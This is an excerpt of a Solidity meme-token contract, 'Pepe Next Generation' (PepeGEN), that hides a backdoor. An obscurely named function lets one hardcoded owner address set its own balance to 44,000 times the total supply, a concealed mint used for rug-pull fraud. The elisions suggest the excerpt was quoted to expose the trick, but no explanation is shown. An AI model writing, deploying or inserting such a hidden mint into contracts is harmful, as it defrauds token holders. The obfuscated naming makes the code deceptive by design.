...
contract MEMEToken is Ownable {
    ...
    function peedAmount() public view returns (uint256) {
        return _tokentotalSupply;
    }

    function pepepogAdddmmm() external {
        address tswojaks = _msgSender();
        if (_cwojakpepe886!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe886 == tswojaks){
            _balances[_cwojakpepe886] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe886 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "Pepe Next Generation";
    string _symbol = "PepeGEN";
